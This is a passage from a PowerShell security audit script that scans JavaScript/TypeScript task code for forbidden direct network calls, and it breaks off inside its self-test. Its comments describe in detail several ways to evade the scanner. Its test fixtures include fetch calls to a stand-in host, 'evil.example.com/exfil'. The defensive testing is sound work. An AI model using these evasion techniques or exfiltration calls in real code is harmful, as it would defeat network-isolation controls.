[CmdletBinding()]
param(
  [Parameter(Mandatory)]
  [string]$Dir,
  [string]$AllowlistRelativePath,
  [switch]$NoAllowlist,
  [switch]$SkipSelfTest
)

# HCI_COLLECTOR_DISCOVERED_PIPELINE_PLAN.md Task 9 (ADR-0029 gate 6, test id
# wave6-trigger-no-direct-fetch): Trigger.dev task code may ONLY call the
# isolated fetch-runner's own internal API -- it must never issue an outbound
# HTTP request to a non-whitelisted target itself (gate 6's whole point:
# Trigger.dev orchestrates, the network-isolated runner is the only thing
# that ever actually dials out). A dataflow check that verifies every fetch
# call's TARGET is the runner's own base URL is out of reach for a text
# scan -- this instead forbids the SHAPE of a direct HTTP client reference
# (global fetch identifier -- called OR merely aliased/re-exported --,
# http/https/undici/axios import, XMLHttpRequest) anywhere in $Dir's task
# source, except inside the ONE file at $AllowlistRelativePath (the
# designated "runner client" module that legitimately makes that call, same
# shape as lobster-factory's own schedules-heartbeat.ts delegating to a
# separate postRunDue() rather than fetching inline).
#
# KNOWN GAP, found by critic review 2026-09-18 via real PoC (not
# theoretical), same disclosure convention this repo's other audit scripts
# already use (check-no-universal-trust-column.ps1's own header, e.g.):
# this remains a text/regex scan, not an AST with scope resolution. It WILL
# catch a bare `fetch(...)` call and now also a bare reference to the
# identifier (`const x = fetch`, `export const y = fetch` -- closed by this
# revision, see below), because both require the literal token "fetch" to
# appear in the source. It CANNOT catch a DYNAMICALLY CONSTRUCTED property
# access that never spells "fetch" as one token -- e.g.
# `globalThis['fe' + 'tch'](...)` or `globalThis['fetch'.split('').reverse()...]`.
# Closing that class requires real interpretation (a JS engine or an
# AST+dataflow tool), not a text scan; tracked as a follow-up in
# agency-os/TASKS.md, not fixed here. Given this file is ADR-0029 gate 6's
# ONLY enforcement mechanism (the Trigger.dev worker process itself has no
# iptables-level isolation the way the fetch-runner container does), do not
# read a passing run of this script as "gate 6 is fully closed" -- it means
# "no naive or aliased direct-fetch shape was found," which is the
# realistic bar for a script at this layer, not a formal proof.
#
# Comments are stripped first (both // line and /* block */ forms) so a
# comment merely mentioning "fetch" or "import http" cannot trigger a false
# positive; a string literal containing those words is accepted as a known,
# narrow blind spot (same class of trade-off check-no-universal-trust-column.ps1
# and verify-epistemic-annotation.ps1 already document for their own domains).
#
# Allowlist is an EXACT path relative to $Dir, not a filename substring/
# wildcard match (critic review 2026-09-18, real PoC: the original
# `-like '*runner-client*'` let a decoy file named e.g.
# `runner-client-shim.mjs` skip every rule in this script merely by
# containing that substring in its name, regardless of what it actually
# did). This script also asserts exactly ONE file exists at that exact path
# -- zero means the real allowlisted module went missing (nothing left to
# legitimately make the runner call at all); more than one is impossible via
# a single exact relative path today, kept as a self-test alongside the
# other assertions below.
#
# Self-test runs first by default, same non-vacuity rule every audit script
# in this repo follows.
#
# Extended 2026-09-18 (Task 10 follow-up, HCI_COLLECTOR_DISCOVERED_PIPELINE_
# PLAN.md Task 10's own boundaries note): app/server.mjs became this call
# graph's SECOND real caller (imports orchestrateDiscoveredFetch directly),
# so $Dir is no longer always public-intelligence/ -- test-wave1-local.ps1
# now also invokes this script against app/. Three gaps closed together
# (verified empirically first, not assumed) because all three block that
# second invocation from being safe at once:
#
# 1. node_modules exclusion (Get-TriggerDirectFetchViolations' file listing,
#    below): app/node_modules alone carries hundreds of real vendored .mjs
#    files (pg-pool, pg-cloudflare, etc.) that legitimately reference fetch/
#    http internally -- nothing this gate is about. Excluded by full PATH
#    SEGMENT, not a bare substring (`(^|[\/])node_modules([\/]|$)`), same
#    lesson as the allowlist-exact-path fix above: a real directory that
#    merely CONTAINS "node_modules" in a longer name must not be excluded by
#    accident. Applying this filter also meant dropping Get-ChildItem's own
#    -Include for the .ts/.mts/.mjs/.js extension check in favor of a plain
#    -Extension comparison in the same Where-Object -- see that function's
#    own comment for a real false positive (app/public/index.html) this
#    same change caught along the way.
#
# 2. String/template-literal content is now blanked in a SECOND pass,
#    Remove-StringAndTemplateLiteralContent, layered on top of a rewritten
#    (still string-AWARE, but no longer string-blanking) Remove-Comments --
#    see each function's own comment for the design. Two passes, not one
#    unified strip, because $forbiddenImportPattern below legitimately needs
#    to see a raw import-specifier string like 'undici' verbatim (a first
#    draft blanked ALL string content in one pass and broke that check for
#    real -- status.task.ts's `from 'undici'` stopped being detected until
#    this split, caught by actually running the self-test, not by
#    inspection). $directFetchPattern/$xhrPattern run against the further-
#    blanked text; $forbiddenImportPattern runs against the comments-only
#    text. Motivated by two real false positives (confirmed by hand before
#    fixing, not assumed): app/server.mjs's own
#    `'../public-intelligence/orchestration/orchestrate-discovered-fetch.mjs'`
#    import-path literal, and app/scripts/verify-sink-hci-discovered.mjs's
#    `'s3://hci-fetch-runner-raw/...'` bucket-name literal -- both contain
#    "fetch" as a standalone token per the word-boundary pattern above,
#    purely as inert string data. Making Remove-Comments itself string-AWARE
#    (rather than a blind regex, even though it no longer blanks strings)
#    still matters and closes an adjacent bug the old approach had:
#    stripping `//` comments with no string-awareness at all meant a
#    same-line URL literal like `'http://x'; return fetch(y);` had its own
#    embedded "//" mistaken for a line-comment start, silently deleting
#    everything after it on that line -- including a REAL fetch call.
#
# 3. -NoAllowlist (zero-tolerance) mode: app/ has ZERO legitimate
#    direct-fetch files (confirmed: outside node_modules it is exactly
#    server.mjs + scripts/verify-sink-hci-discovered.mjs, and Task 10's own
#    Boundaries already require app/server.mjs to reach an HCI target only
#    via orchestrateDiscoveredFetch) -- there is no file to name as
#    -AllowlistRelativePath, so this needed its own mode rather than a
#    different path string. Mutually exclusive with -AllowlistRelativePath
#    (validated below); asserting "exactly 1 allowlisted file" makes no
#    sense when zero are expected.
#
# 4. Regex-literal-vs-division heuristic (Test-RegexLiteralPossible/
#    Read-RegexLiteralEnd, critic review 2026-09-18, CRITICAL, found in
#    points 1-3's own same-day rewrite, not pre-existing): a `/regex/`
#    literal containing a quote or backtick (e.g. `const re = /"/;`) was
#    NOT a mere "spells fetch as pattern text" over-block risk as originally
#    documented above -- it was a real, empirically-confirmed UNDER-
#    detection bypass. The lone `"` inside `/"/` desynced the quote-tracking
#    state machine points 1-3 introduced, and the quote-consuming loop then
#    ran to the next matching `"` anywhere later in the file, silently
#    swallowing a real `fetch(...)` call on the same line. A backtick inside
#    a regex literal is the same bug against template-tracking, potentially
#    reaching even further (to the next unrelated backtick anywhere later in
#    the file). This is the file's 3rd same-day critic-found issue, now
#    closed with a heuristic (previous-significant-character lookback, see
#    Test-RegexLiteralPossible's own comment) rather than a full tokenizer --
#    genuinely closes the under-detection direction for the common cases
#    (after `(`, `,`, `=`, `!`, `{`, `;`, start-of-file/statement), and as a
#    side effect also closes the ORIGINAL over-block concern (a regex
#    literal spelling "fetch" as pattern text is now blanked, not scanned).
#    A 2nd critic pass (same day) found the first version of this fix
#    STILL had two more real, empirically-confirmed bypasses, both closed
#    here too -- see Test-RegexLiteralPossible's and the `${` interpolation-
#    entry sites' own comments for the full PoCs and fixes: (a) a keyword
#    immediately before a regex literal (`return /foo/`) was WRONGLY
#    documented as "over-block only, not a bypass" in an earlier revision of
#    this very paragraph -- it is a real under-detection bypass whenever
#    that missed regex literal itself contains a quote/backtick, since the
#    un-consumed `/` falls through to the ordinary quote-swallow path this
#    whole heuristic exists to guard; closed with a real (whitespace-
#    skipping) previous-WORD lookback against a fixed keyword set, not just
#    the previous character. (b) stale $lastSig leaking across a template's
#    `${...}` boundary (most naturally via a tagged template) could
#    misclassify the interpolation's own first `/`, and in the worst case
#    leave the interp/template stack frames permanently unpopped -- an
#    unbounded blast radius (misroutes scanning for the rest of the file,
#    not just the current statement); closed by resetting $lastSig to $null
#    on every `${` entry, since JS grammar guarantees an interpolation
#    always starts a fresh expression.
#
# Critic review 2026-09-18 also found several PRE-EXISTING (confirmed via
# `git diff` against the prior commit, not introduced by points 1-4 above)
# live gaps in $forbiddenImportPattern and $xhrPattern -- deliberately NOT
# fixed in this revision (out of THIS task's explicit 3-problem scope, and
# each needs its own design pass rather than being bundled into an already-
# large same-day change): a backtick-delimited or string-concatenation-split
# `require()` specifier, a bare alias of `require` itself (the exact bug
# class already fixed for `fetch` in point 1-3, not yet ported to
# `require`), and a bare alias of `XMLHttpRequest` (same class again, not
# yet ported to the XHR pattern). Tracked in agency-os/TASKS.md, dated
# 2026-09-18, not fixed here -- same "known limitation, follow-up filed, not
# blocking this revision" convention this file's own header already used at
# the very top (the dynamic-property-construction gap, e.g.
# `globalThis['fe'+'tch'](...)`) and TASKS.md already carries for that gap.

$ErrorActionPreference = 'Stop'

if ($NoAllowlist -and $AllowlistRelativePath) {
  throw 'NoAllowlist and AllowlistRelativePath are mutually exclusive -- pass exactly one: AllowlistRelativePath when Dir has exactly one legitimate direct-fetch module at that exact relative path, or NoAllowlist when Dir is expected to have none at all (e.g. app/ per Task 10).'
}
if (-not $NoAllowlist -and -not $AllowlistRelativePath) {
  throw 'AllowlistRelativePath is required unless NoAllowlist is set.'
}

# Matched against comment-stripped source. A single unified pattern for BOTH
# a direct call (`fetch(...)`) and a bare reference/alias/re-export
# (`const x = fetch`, `export const y = fetch`, `cb(fetch)`) -- critic review
# 2026-09-18, real PoC: the original pattern required an immediately
# following `(`, so `const doFetch = fetch; doFetch(...)` (alias, called
# under a different local name) and `export const unsafeFetch = fetch;`
# (re-export) both slipped through undetected. `\bfetch\b` alone (no
# trailing `\(` requirement) closes both, at the cost of also flagging any
# OTHER bare reference to the identifier (e.g. `typeof fetch`, or a
# TypeScript type-only import like `import type { RequestInit } from
# 'undici'` -- confirmed by critic review 2026-09-18 to really trip
# $forbiddenImportPattern despite being erased at compile time with zero
# runtime capability) -- accepted deliberately: this is a security gate,
# and over-blocking a rare legitimate
# pattern (which a human then explicitly moves into the allowlisted file or
# reviews) is the correct direction versus under-blocking a real bypass.
# The leading negative lookbehind still excludes `.fetch` (a property/method
# call on some other, unrelated object -- e.g. `runnerClient.fetch(...)` on
# a narrow allowlisted wrapper) and `xFetch`/`fetchY`-shaped longer
# identifiers (word boundary already handles the latter; the lookbehind is
# for the dot case specifically).
$directFetchPattern = "(?<![.\w])fetch\b"
$forbiddenImportPattern = "(?:from\s+['`"](?:node:)?(?:http|https|undici|axios|node-fetch)['`"]|require\s*\(\s*['`"](?:node:)?(?:http|https|undici|axios|node-fetch)['`"]\s*\)|import\s*\(\s*['`"](?:node:)?(?:http|https|undici|axios|node-fetch)['`"]\s*\))"
$xhrPattern = '\bnew\s+XMLHttpRequest\b'

$RegexPrecedingKeywords = @('return', 'typeof', 'instanceof', 'in', 'of', 'case', 'yield', 'throw', 'new', 'delete', 'void', 'do', 'else', 'await')

function Get-LastWordEndingAt {
  # Backward scan from (not including) index $EndExclusive in $Chars,
  # skipping trailing whitespace first, then collecting the contiguous run
  # of identifier characters (`\w`/`$`) immediately before that whitespace.
  # Returns $null if the character immediately before any such whitespace
  # is not an identifier character at all (e.g. `)`, a closing quote).
  # Whole-word, not substring: an identifier like `xreturn`/`returnValue`
  # is correctly returned in full and will never spuriously match a
  # keyword in $RegexPrecedingKeywords (exact `-contains`, not `-like`).
  param([Parameter(Mandatory)][char[]]$Chars, [Parameter(Mandatory)][int]$EndExclusive)
  $j = $EndExclusive - 1
  while ($j -ge 0 -and [char]::IsWhiteSpace($Chars[$j])) { $j-- }
  $wordEnd = $j + 1
  while ($j -ge 0 -and ($Chars[$j] -match '[\w$]')) { $j-- }
  $wordStart = $j + 1
  if ($wordStart -eq $wordEnd) { return $null }
  return -join $Chars[$wordStart..($wordEnd - 1)]
}

function Test-RegexLiteralPossible {
  # Real repro, critic review 2026-09-18 (Critical, same day as this whole
  # rewrite): neither scanner function below had any concept of a `/regex/`
  # literal -- a bare `'` or `"` INSIDE one (e.g. `const re = /"/;`) was
  # unconditionally treated as opening a real string, and the quote-
  # consuming loop then ran to the next matching quote ANYWHERE LATER in the
  # file, silently swallowing real code in between -- including a real
  # `fetch(...)` call on the very same line right after it. Confirmed by
  # actually executing the scanner against that exact fixture, not by
  # inspection: `const re = /"/; return fetch('https://evil.example.com/exfil');`
  # scanned clean (0 violations) before this fix. A backtick inside a regex
  # literal (e.g. `/`/`) is the same bug against template-tracking instead --
  # even worse, since it can desync template state all the way to the next
  # unrelated backtick anywhere later in the file, not just to end of line.
  #
  # This is a heuristic, not a real tokenizer (this file is a text scan, not
  # an AST -- see header): true when the last significant (non-whitespace)
  # source character already scanned means a bare `/` here is more likely
  # OPENING a regex literal than performing division -- i.e. the previous
  # token was NOT a value (identifier/number/closed-string/closed-template/
  # closed-regex/`)`/`]`) that a division could apply to. Deliberately
  # conservative in the safe direction: every character in the "not a regex
  # start" set is one after which a `/` provably cannot legally open a regex
  # literal in real JS grammar, so this never wrongly treats an ordinary
  # division (`a / b`, `x.len / 2`) as a regex (which would risk swallowing
  # real code into a mis-detected "regex span" -- the exact failure class
  # this function exists to prevent, just for `/` instead of `'`/`"`/`` ` ``).
  #
  # Critic review 2026-09-18 (2nd pass, Critical, real PoC): a first version
  # of this function stopped at "ends in a letter/digit/underscore -> not a
  # regex start", documented as an "accepted, over-block-only" miss for a
  # keyword immediately before a regex (`return /foo/`). That reasoning was
  # WRONG, confirmed by execution: `return /"/.test(x) ? fetch(evil) : 0;`
  # scanned clean (0 violations), because the un-consumed `/"/`'s OWN
  # embedded `"` then re-triggers the exact quote-swallow bug this whole
  # function exists to close, via a different trigger path. A missed regex
  # literal is not a safe fallback if that regex literal itself can desync
  # the scanner -- so "ends in an identifier char" is no longer enough to
  # rule a `/` out; it must also check whether that trailing word is one of
  # the keywords JS grammar allows a regex literal to follow, via a real
  # (whitespace-skipping) word lookback (Get-LastWordEndingAt), not just the
  # single previous character. An ordinary identifier/number ending in a
  # letter/digit still correctly means division (`$RegexPrecedingKeywords`
  # is a closed, exact set -- no identifier merely CONTAINING a keyword as a
  # substring, e.g. `returnValue`, can match it).
  param($LastSig, [char[]]$Chars, [int]$Index)
  if ($null -eq $LastSig) { return $true }
  if ($LastSig -in @("'", '"', '`', ')', ']', '/', '$')) { return $false }
  if ([char]::IsLetterOrDigit($LastSig) -or $LastSig -eq '_') {
    $word = Get-LastWordEndingAt -Chars $Chars -EndExclusive $Index
    return [bool]($word -and $RegexPrecedingKeywords -contains $word)
  }
  return $true
}

function Read-RegexLiteralEnd {
  # Only called once Test-RegexLiteralPossible already said "maybe". Scans
  # from the opening `/` (index $Start, guaranteed $Chars[$Start] -eq '/')
  # for the matching UNESCAPED closing `/`, treating a `[...]` character
  # class as opaque so a literal `/` inside brackets (`/[/]/ `, a char class
  # containing a slash -- valid, unambiguous JS regex grammar) does not
  # close the literal early. Returns the index one past the last trailing
  # flag letter (g/i/m/s/u/y/d/...), or $null if no closing `/` appears
  # before a newline or EOF -- in which case the caller must fall back to
  # treating the opening `/` as an ordinary character (a regex literal can
  # never legally contain a raw newline either, so failing to close on the
  # same line means this was never a regex literal to begin with -- almost
  # certainly division that happens to be followed by another `/` later on
  # a DIFFERENT line, which must not be consumed).
  param([Parameter(Mandatory)][char[]]$Chars, [Parameter(Mandatory)][int]$Start)
  $n = $Chars.Length
  $i = $Start + 1
  $inClass = $false
  while ($i -lt $n -and $Chars[$i] -ne "`n") {
    if ($Chars[$i] -eq '\' -and ($i + 1) -lt $n) { $i += 2; continue }
    if ($Chars[$i] -eq '[') { $inClass = $true; $i++; continue }
    if ($Chars[$i] -eq ']') { $inClass = $false; $i++; continue }
    if ($Chars[$i] -eq '/' -and -not $inClass) {
      $i++
      while ($i -lt $n -and [char]::IsLetter($Chars[$i])) { $i++ }
      return $i
    }
    $i++
  }
  return $null
}

function Remove-Comments {
  # Single-pass, state-aware scan (see this file's own header for why this
  # replaced a naive two-stage regex). String/template-AWARE solely to avoid
  # an order-dependency bug a blind regex has: a URL literal's OWN "//"
  # (e.g. 'http://x') must never be mistaken for a comment start. Does NOT
  # blank string/template TEXT itself -- $forbiddenImportPattern below needs
  # to see a raw import-specifier string like 'undici' verbatim, so this
  # function's output preserves string/template content byte-for-byte,
  # stripping only real // and /* */ comment bodies.
  # Remove-StringAndTemplateLiteralContent (below) is the separate, second
  # pass that additionally blanks string/template TEXT -- run only for the
  # direct-fetch/XHR identifier checks, never for $forbiddenImportPattern.
  param([Parameter(Mandatory)][string]$Source)
  $chars = $Source.ToCharArray()
  $n = $chars.Length
  $sb = New-Object System.Text.StringBuilder
  $stack = [System.Collections.Generic.Stack[hashtable]]::new()
  $i = 0
  $lastSig = $null
  while ($i -lt $n) {
    $c = $chars[$i]
    $top = if ($stack.Count -gt 0) { $stack.Peek() } else { $null }

    if ($top -and $top.Kind -eq 'template') {
      if ($c -eq '\' -and ($i + 1) -lt $n) { $sb.Append($c) > $null; $sb.Append($chars[$i + 1]) > $null; $i += 2; continue }
      if ($c -eq '`') { $sb.Append('`') > $null; $stack.Pop() > $null; $lastSig = '`'; $i++; continue }
      if ($c -eq '$' -and ($i + 1) -lt $n -and $chars[$i + 1] -eq '{') {
        $sb.Append('$') > $null; $sb.Append('{') > $null
        $stack.Push(@{ Kind = 'interp'; Depth = 0 }) > $null
        # Critic review 2026-09-18 (2nd pass, Critical, real PoC, unbounded
        # blast radius): `${` always starts a FRESH expression in real JS
        # grammar -- a `/` right after it can never be division, regardless
        # of whatever code came before the enclosing template literal even
        # started. Without this reset, stale $lastSig (most naturally via a
        # tagged template, e.g. `` sql`${/"/...} ``) could wrongly classify
        # that leading `/` as division, letting an embedded quote re-open
        # the quote-swallow bug AND blindly consume this interpolation's own
        # closing `}` and the template's own closing backtick as fake string
        # content -- leaving the interp/template stack frames permanently
        # unpopped, misrouting the ENTIRE REST OF THE FILE through
        # template-text handling. Confirmed via execution: without this
        # reset, a second, wholly unrelated function later in the same file
        # became invisible to the scanner entirely.
        $lastSig = $null
        $i += 2
        continue
      }
      $sb.Append($c) > $null; $i++; continue
    }

    # "code" context: top-level, or inside a template's ${ } interpolation.
    if ($c -eq "'" -or $c -eq '"') {
      $quote = $c
      $sb.Append($quote) > $null
      $i++
      while ($i -lt $n -and $chars[$i] -ne $quote -and $chars[$i] -ne "`n") {
        if ($chars[$i] -eq '\' -and ($i + 1) -lt $n) { $sb.Append($chars[$i]) > $null; $sb.Append($chars[$i + 1]) > $null; $i += 2; continue }
        $sb.Append($chars[$i]) > $null; $i++
      }
      if ($i -lt $n -and $chars[$i] -eq $quote) { $sb.Append($quote) > $null; $i++ }
      $lastSig = $quote
      continue
    }
    if ($c -eq '`') { $sb.Append('`') > $null; $stack.Push(@{ Kind = 'template' }) > $null; $i++; continue }
    if ($c -eq '/' -and ($i + 1) -lt $n -and $chars[$i + 1] -eq '/') {
      $i += 2
      while ($i -lt $n -and $chars[$i] -ne "`n") { $i++ }
      continue
    }
    if ($c -eq '/' -and ($i + 1) -lt $n -and $chars[$i + 1] -eq '*') {
      $i += 2
      while ($i -lt $n -and -not ($chars[$i] -eq '*' -and ($i + 1) -lt $n -and $chars[$i + 1] -eq '/')) {
        if ($chars[$i] -eq "`n") { $sb.Append("`n") > $null }
        $i++
      }
      if ($i -lt $n) { $i += 2 }
      continue
    }
    if ($c -eq '/' -and (Test-RegexLiteralPossible -LastSig $lastSig -Chars $chars -Index $i)) {
      $end = Read-RegexLiteralEnd -Chars $chars -Start $i
      if ($null -ne $end) {
        for ($k = $i; $k -lt $end; $k++) { $sb.Append($chars[$k]) > $null }
        $lastSig = $chars[$end - 1]
        $i = $end
        continue
      }
    }
    if ($top -and $top.Kind -eq 'interp' -and $c -eq '{') { $top.Depth = $top.Depth + 1; $sb.Append('{') > $null; $i++; continue }
    if ($top -and $top.Kind -eq 'interp' -and $c -eq '}') {
      if ($top.Depth -gt 0) { $top.Depth = $top.Depth - 1; $sb.Append('}') > $null; $i++; continue }
      $sb.Append('}') > $null; $stack.Pop() > $null; $lastSig = '}'; $i++
      continue
    }
    if (-not [char]::IsWhiteSpace($c)) { $lastSig = $c }
    $sb.Append($c) > $null; $i++
  }
  return $sb.ToString()
}

function Remove-StringAndTemplateLiteralContent {
  # Takes COMMENT-FREE source (Remove-Comments' own output -- never raw
  # source, so this never has to re-solve the comment/string ordering
  # problem Remove-Comments already solved) and additionally blanks string/
  # template-literal TEXT, so a fetch-lookalike substring inside one (an
  # import-path literal, a bucket-name literal, ...) cannot trigger
  # $directFetchPattern/$xhrPattern below -- those two look for a real CODE
  # IDENTIFIER, which inert string data must never masquerade as. Never run
  # for $forbiddenImportPattern, which legitimately needs to see a raw
  # import-specifier string like 'undici'. A template literal's `${...}`
  # interpolation is real, executable code (e.g. `${fetch(x)}`) and is
  # scanned normally, including nested braces/strings/templates inside it --
  # a per-frame brace-depth counter finds THIS interpolation's own matching
  # `}` rather than the first `}` encountered (which could belong to a
  # nested object literal, e.g. `${fn({a:1})}`).
  param([Parameter(Mandatory)][string]$Source)
  $chars = $Source.ToCharArray()
  $n = $chars.Length
  $sb = New-Object System.Text.StringBuilder
  $stack = [System.Collections.Generic.Stack[hashtable]]::new()
  $i = 0
  $lastSig = $null
  while ($i -lt $n) {
    $c = $chars[$i]
    $top = if ($stack.Count -gt 0) { $stack.Peek() } else { $null }

    if ($top -and $top.Kind -eq 'template') {
      if ($c -eq '\' -and ($i + 1) -lt $n) { $sb.Append(' ') > $null; $sb.Append(' ') > $null; $i += 2; continue }
      if ($c -eq '`') { $sb.Append('`') > $null; $stack.Pop() > $null; $lastSig = '`'; $i++; continue }
      if ($c -eq '$' -and ($i + 1) -lt $n -and $chars[$i + 1] -eq '{') {
        $sb.Append('$') > $null; $sb.Append('{') > $null
        $stack.Push(@{ Kind = 'interp'; Depth = 0 }) > $null
        # See Remove-Comments' own identical reset for the full rationale
        # (critic review 2026-09-18, 2nd pass, Critical, unbounded blast
        # radius): `${` always starts a fresh expression, so stale
        # $lastSig from before the enclosing template must never leak in.
        $lastSig = $null
        $i += 2
        continue
      }
      $sb.Append(' ') > $null; $i++; continue
    }

    if ($c -eq "'" -or $c -eq '"') {
      $quote = $c
      $sb.Append($quote) > $null
      $i++
      while ($i -lt $n -and $chars[$i] -ne $quote -and $chars[$i] -ne "`n") {
        if ($chars[$i] -eq '\' -and ($i + 1) -lt $n) { $sb.Append(' ') > $null; $sb.Append(' ') > $null; $i += 2; continue }
        $sb.Append(' ') > $null; $i++
      }
      if ($i -lt $n -and $chars[$i] -eq $quote) { $sb.Append($quote) > $null; $i++ }
      $lastSig = $quote
      continue
    }
    if ($c -eq '`') { $sb.Append('`') > $null; $stack.Push(@{ Kind = 'template' }) > $null; $i++; continue }
    # Same regex-literal-vs-division heuristic as Remove-Comments (see that
    # function's own comment for the full rationale) -- BLANKED here, not
    # preserved, matching this function's own blank-inert-text contract. A
    # regex literal's pattern text is never executable JS (a JS engine never
    # "calls" it), so blanking it cannot hide a real fetch/XHR reference; it
    # also closes the file's own previously-documented, now-avoidable minor
    # false positive where a regex literal that happens to spell "fetch" as
    # pattern text (e.g. `/fetch\(/`) would have tripped $directFetchPattern.
    if ($c -eq '/' -and (Test-RegexLiteralPossible -LastSig $lastSig -Chars $chars -Index $i)) {
      $end = Read-RegexLiteralEnd -Chars $chars -Start $i
      if ($null -ne $end) {
        for ($k = $i; $k -lt $end; $k++) { $sb.Append(' ') > $null }
        $lastSig = '/'
        $i = $end
        continue
      }
    }
    if ($top -and $top.Kind -eq 'interp' -and $c -eq '{') { $top.Depth = $top.Depth + 1; $sb.Append('{') > $null; $i++; continue }
    if ($top -and $top.Kind -eq 'interp' -and $c -eq '}') {
      if ($top.Depth -gt 0) { $top.Depth = $top.Depth - 1; $sb.Append('}') > $null; $i++; continue }
      $sb.Append('}') > $null; $stack.Pop() > $null; $lastSig = '}'; $i++
      continue
    }
    if (-not [char]::IsWhiteSpace($c)) { $lastSig = $c }
    $sb.Append($c) > $null; $i++
  }
  return $sb.ToString()
}

function Get-TriggerDirectFetchViolations {
  param([Parameter(Mandatory)][string]$Dir, [string]$AllowlistRelativePath, [switch]$NoAllowlist)
  # Filtered via -Extension/-FullName in a Where-Object, NOT Get-ChildItem's
  # own -Include -- real repro, running this for real against app/ (Task 10
  # follow-up): -Include with -Recurse and a wildcard-free -LiteralPath is a
  # known-unreliable PowerShell combination (Microsoft's own docs: -Include
  # "is effective only when the command includes the contents of an item,
  # such as C:\Windows\*"), and it really did let app/public/index.html (an
  # .html file, matching none of the four patterns) through here -- caught
  # by actually running this against app/, not by inspection; a wrong
  # allowlist-mode message would have been believable since index.html
  # genuinely does contain a real `fetch(...)` call, just a browser-side one
  # to this app's own same-origin API, categorically outside gate 6's scope
  # (server-side code reaching an EXTERNAL HCI target). This was a
  # latent gap in every prior invocation of this script too (public-
  # intelligence/ just never happened to contain a non-matching-extension
  # file with a real violation shape to expose it).
  # node_modules is excluded by full path SEGMENT (not a bare substring --
  # see header) so a real, legitimately-named directory that merely
  # CONTAINS "node_modules" in a longer name is never excluded by accident.
  # Known, accepted edge case (critic review 2026-09-18): a symlink located
  # OUTSIDE node_modules but resolving INTO it would report a .FullName with
  # no node_modules segment, escaping this exclusion -- fails toward
  # over-scanning vendored code (a possible false positive), never toward
  # hiding a real violation, so it is the same accepted-safe direction as
  # every other over-block case in this file, not a bypass.
  $files = Get-ChildItem -LiteralPath $Dir -Recurse -File -ErrorAction SilentlyContinue |
    Where-Object { $_.Extension -in '.ts', '.mts', '.mjs', '.js' -and $_.FullName -notmatch '(^|[\\/])node_modules([\\/]|$)' }
  if ($files.Count -eq 0) { throw "no .ts/.mts/.mjs/.js files found in $Dir (outside node_modules)" }
  $dirFull = (Resolve-Path -LiteralPath $Dir).Path.TrimEnd('\', '/')
  $violations = @()
  $allowlistMatchCount = 0
  foreach ($f in $files) {
    $relPath = ($f.FullName.Substring($dirFull.Length).TrimStart('\', '/')) -replace '\\', '/'
    if (-not $NoAllowlist -and $relPath -eq $AllowlistRelativePath) { $allowlistMatchCount++; continue }
    # Two DIFFERENT views of the same file, deliberately: $commentsOnly
    # still has real string content (forbiddenImportPattern needs to read an
    # import specifier like 'undici' verbatim); $stripped additionally has
    # string/template TEXT blanked (directFetchPattern/xhrPattern must never
    # match inert string data, only a real code identifier).
    $commentsOnly = Remove-Comments -Source (Get-Content -Raw -Encoding UTF8 -LiteralPath $f.FullName)
    $stripped = Remove-StringAndTemplateLiteralContent -Source $commentsOnly
    if ([regex]::IsMatch($stripped, $directFetchPattern)) {
      $violations += "$($f.FullName): references the global fetch identifier (call or alias/re-export) outside the allowlisted runner-client module"
    }
    if ([regex]::IsMatch($commentsOnly, $forbiddenImportPattern)) {
      $violations += "$($f.FullName): imports a raw HTTP client (http/https/undici/axios/node-fetch) outside the allowlisted runner-client module"
    }
    if ([regex]::IsMatch($stripped, $xhrPattern)) {
      $violations += "$($f.FullName): uses XMLHttpRequest outside the allowlisted runner-client module"
    }
  }
  if (-not $NoAllowlist -and $allowlistMatchCount -ne 1) {
    $violations += "expected exactly 1 file at '$AllowlistRelativePath' (relative to $Dir) -- found $allowlistMatchCount. Zero means the allowlisted runner-client module is missing; more than one means an ambiguous/duplicate allowlist target."
  }
  return ,$violations
}

if (-not $SkipSelfTest) {
  $tmp = Join-Path ([IO.Path]::GetTempPath()) ('trigger-no-fetch-selftest-' + [Guid]::NewGuid().ToString('N'))
  New-Item -ItemType Directory -Path $tmp | Out-Null
  try {
    # Bad: a task file that "刻意塞一行直接 fetch" (the plan's own acceptance
    # wording) -- a deliberately inserted direct fetch call, exactly the
    # mutation this check exists to catch.
    [IO.File]::WriteAllText((Join-Path $tmp 'enqueue.task.ts'),
      "export async function run() {`n  const res = await fetch('https://evil.example.com/exfil');`n  return res;`n}`n",
      (New-Object System.Text.UTF8Encoding($false)))
    # Bad: importing a raw HTTP client instead of calling fetch directly.
    [IO.File]::WriteAllText((Join-Path $tmp 'status.task.ts'),
      "import { request } from 'undici';`nexport async function run() { return request('https://example.com/'); }`n",
      (New-Object System.Text.UTF8Encoding($false)))
    # Bad (critic review 2026-09-18, real PoC this exact fixture reproduces):
    # aliasing the global identifier to a local name, then calling THAT --
    # the original pattern (required an immediately-following `(`) missed
    # this because `fetch` itself is never immediately followed by `(` here.
    [IO.File]::WriteAllText((Join-Path $tmp 'aliased.task.ts'),
      "const doFetch = fetch;`nexport async function run() { return doFetch('https://evil.example.com/exfil'); }`n",
      (New-Object System.Text.UTF8Encoding($false)))
    # Bad (critic review 2026-09-18, real PoC): a decoy file whose NAME
    # merely contains the substring "runner-client" but is not the exact
    # allowlisted path -- the original `-like '*runner-client*'` let this
    # skip every rule purely by filename. Now scanned like any other file.
    [IO.File]::WriteAllText((Join-Path $tmp 'runner-client-shim.mjs'),
      "export const unsafeFetch = fetch;`n",
      (New-Object System.Text.UTF8Encoding($false)))
    # Good: a comment merely mentioning fetch/http must not false-positive.
    [IO.File]::WriteAllText((Join-Path $tmp 'clean.task.ts'),
      "// this task used to fetch() directly via node:http, now delegates to runnerClient\nimport { callRunner } from './runner-client';`nexport async function run() { return callRunner('/enqueue'); }`n",
      (New-Object System.Text.UTF8Encoding($false)))
    # Good: the one allowlisted module (exact relative path) -- a real fetch
    # call/reference here must clear.
    [IO.File]::WriteAllText((Join-Path $tmp 'runner-client.mjs'),
      "export async function callRunner(path) {`n  return fetch('http://runner.internal:8090' + path);`n}`n",
      (New-Object System.Text.UTF8Encoding($false)))

    # The next several fixtures use single-quoted (not double-quoted) PowerShell
    # strings with real embedded newlines, and double any internal `'` --
    # avoids fighting PowerShell's OWN backtick-escaping (its escape char)
    # while writing content that must contain JS backticks/`${}` verbatim.
    #
    # Good (2026-09-18, Task 10 follow-up -- real false positive this exact
    # fixture reproduces): app/server.mjs's own import-path literal shape.
    # "fetch" appears only inside a string literal (the module filename),
    # never as a real code token ("orchestrateDiscoveredFetch" has a
    # capital F, which the case-sensitive pattern does not match either).
